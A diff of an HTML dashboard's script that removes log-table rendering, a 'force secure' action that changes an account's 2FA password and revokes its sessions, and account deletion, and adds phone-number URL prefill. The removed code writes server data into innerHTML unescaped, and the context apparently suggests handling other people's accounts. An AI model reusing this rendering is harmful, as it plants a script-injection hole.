-                    <td class="px-4 py-3 text-sm text-gray-400">${acc.delivered_at ? new Date(acc.delivered_at).toLocaleString() : '-'}</td>
-                </tr>
-            `).join('');
-        }
-
-        async function loadLogs() {
-            const phone = document.getElementById('log-filter-phone').value.trim();
-            
-            try {
-                const url = phone ? `${API_BASE}/logs?phone=${phone}` : `${API_BASE}/logs`;
-                const res = await fetch(url);
-                const data = await res.json();
-                
-                if (data.status === 'success') {
-                    renderLogsTable(data.logs);
-                }
-            } catch (e) {
-                console.error('Error loading logs:', e);
-            }
-        }
-
-        function renderLogsTable(logs) {
-            const tbody = document.getElementById('logs-table');
-            if (!logs.length) {
-                tbody.innerHTML = '<tr><td colspan="5" class="text-center py-8 text-gray-400">No logs found</td></tr>';
-                return;
-            }
-            
-            tbody.innerHTML = logs.map(log => `
-                <tr class="border-t border-gray-700 hover:bg-gray-700/50">
-                    <td class="px-4 py-3 text-sm text-gray-400">${new Date(log.created_at).toLocaleString()}</td>
-                    <td class="px-4 py-3 font-mono">${log.phone}</td>
-                    <td class="px-4 py-3">${log.action}</td>
-                    <td class="px-4 py-3">
-                        <span class="px-2 py-1 rounded text-xs ${log.status === 'success' ? 'bg-green-600' : log.status === 'failed' ? 'bg-red-600' : 'bg-yellow-600'}">${log.status}</span>
-                    </td>
-                    <td class="px-4 py-3 text-sm text-gray-400 max-w-xs truncate">${log.details || '-'}</td>
-                </tr>
-            `).join('');
-        }
-
-        function formatDeadline(deadline) {
-            const diff = new Date(deadline) - new Date();
-            if (diff <= 0) return 'EXPIRED';
-            const mins = Math.floor(diff / 60000);
-            const secs = Math.floor((diff % 60000) / 1000);
-            return `${mins}:${secs.toString().padStart(2, '0')}`;
-        }
-
-        async function forceSecure(phone) {
-            showModal('Force Secure Account', `Are you sure you want to force secure ${phone}? This will change the 2FA password and revoke all sessions.`, async () => {
-                try {
-                    const res = await fetch(`${API_BASE}/force-secure`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ phone_number: phone })
-                    });
-                    const data = await res.json();
-                    
-                    if (data.status === 'success') {
-                        showSuccess('Account force secured successfully');
-                        loadAccounts();
-                    } else {
-                        showError(data.error || data.detail);
-                    }
-                } catch (e) {
-                    showError(e.message);
-                }
-            });
-        }
-
-        async function deleteAccount(phone) {
-            showModal('Delete Account', `Are you sure you want to delete ${phone}? This action cannot be undone.`, async () => {
-                try {
-                    const res = await fetch(`${API_BASE}/account/${phone}`, { method: 'DELETE' });
-                    const data = await res.json();
-                    
-                    if (data.status === 'success') {
-                        showSuccess('Account deleted successfully');
-                        loadAccounts();
-                    } else {
-                        showError(data.error || data.detail);
-                    }
-                } catch (e) {
-                    showError(e.message);
-                }
-            });
-        }
-
-        function showModal(title, message, callback) {
-            document.getElementById('modal-title').textContent = title;
-            document.getElementById('modal-message').textContent = message;
-            document.getElementById('confirm-modal').classList.remove('hidden');
-            modalCallback = callback;
-        }
-
-        function closeModal() {
-            document.getElementById('confirm-modal').classList.add('hidden');
-            modalCallback = null;
-        }
-
-        function confirmModalAction() {
-            if (modalCallback) modalCallback();
-            closeModal();
-        }
-
-        function refreshAll() {
-            loadAccounts();
-            loadLogs();
-        }
-
-        function setLoading(btnId, loading) {
-            const btn = document.getElementById(btnId);
-            if (!btn) return;
-            btn.disabled = loading;
-            if (loading) {
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Loading...';
-            }
-        }
-
-        function showError(msg) {
-            alert('Error: ' + msg);
-        }
-
-        function showSuccess(msg) {
-            alert('Success: ' + msg);
-        }
-
-        function showInfo(msg) {
-            alert('Info: ' + msg);
-        }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            loadAccounts();
-            setInterval(loadAccounts, 30000);
-        });
-    </script>
+// URL param support
+const params = new URLSearchParams(location.search);
+if (params.get('phone')) {
+    document.addEventListener('DOMContentLoaded', () => {
+        document.getElementById('phone-input').value = params.get('phone');
+        checkSession();
+    });
+}
+</script>
 </body>
 </html>
